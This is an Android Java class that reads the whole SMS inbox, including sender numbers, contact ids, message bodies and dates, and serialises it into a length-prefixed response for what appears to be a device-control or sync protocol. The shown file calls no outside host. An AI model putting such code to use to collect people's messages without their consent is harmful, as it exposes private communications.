package org.wl.ll.protocol;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

/**
 * Created by wiky on 10/14/14.
 * 短信收件箱内容
 * date:address:person:00x4body
 * <p/>
 * date是时间
 * address是电话号码
 * person是电话号码在联系人列表中对应的项
 * 00x4body是以四字节16进制长度开头的短信内容
 */
public class InboxSMSResponse extends Response {
    private final String URI_SMS_INBOX = "content://sms/inbox";

    private final String SMS_COLUMN_ID = "_id";
    private final String SMS_COLUMN_ADDRESS = "address";
    private final String SMS_COLUMN_PERSON = "person";
    private final String SMS_COLUMN_BODY = "body";
    private final String SMS_COLUMN_DATE = "date";
    private final String SMS_COLUMN_TYPE = "type";

    public InboxSMSResponse(Context ctx) {
        super(ctx);
    }

    @Override
    protected String getString() {
        StringBuilder builder = new StringBuilder();
        try {
            Uri uri = Uri.parse(URI_SMS_INBOX);
            String[] projection = new String[]{SMS_COLUMN_ID, SMS_COLUMN_ADDRESS,
                    SMS_COLUMN_PERSON, SMS_COLUMN_BODY,
                    SMS_COLUMN_DATE, SMS_COLUMN_TYPE};
            Cursor cursor = mContext.getContentResolver().query(uri, projection, null, null, "date desc");
            if (cursor.moveToFirst()) {
                int idIndex = cursor.getColumnIndex(SMS_COLUMN_ID);
                int addressIndex = cursor.getColumnIndex(SMS_COLUMN_ADDRESS);
                int personIndex = cursor.getColumnIndex(SMS_COLUMN_PERSON);
                int bodyIndex = cursor.getColumnIndex(SMS_COLUMN_BODY);
                int dateIndex = cursor.getColumnIndex(SMS_COLUMN_DATE);
                int typeIndex = cursor.getColumnIndex(SMS_COLUMN_TYPE);

                do {
                    String body = cursor.getString(bodyIndex);
                    int person = cursor.getInt(personIndex);
                    String address = cursor.getString(addressIndex);
                    long date = cursor.getLong(dateIndex);
                    int type = cursor.getInt(typeIndex);

                    builder.append(date).append(":").
                            append(address).append(":").
                            append(person).append(":").
                            append(getLength(body)).append(body);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            return getFAIL() + e.getMessage();
        }

        return getOKAY() + builder.toString();
    }
}
